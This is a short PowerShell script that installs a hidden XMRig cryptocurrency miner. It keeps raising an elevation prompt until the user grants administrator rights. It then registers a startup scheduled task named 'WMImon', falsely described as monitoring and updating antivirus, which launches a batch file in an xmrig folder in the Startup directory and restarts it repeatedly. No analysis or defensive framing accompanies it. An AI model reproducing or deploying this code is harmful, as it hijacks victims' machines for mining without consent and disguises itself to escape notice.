
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
   
    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit 
    }
}

Set-Variable -Name Trigger -Value (New-ScheduledTaskTrigger -AtStartup)

Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")

Set-Variable -Name Settings -Value (New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 7) -RestartCount 5 -DontStopIfGoingOnBatteries)

Register-ScheduledTask -Settings $Settings -Action $Action -Trigger $Trigger -Description "Monitor and update Antivirus if any error occurs." -TaskName "WMImon"
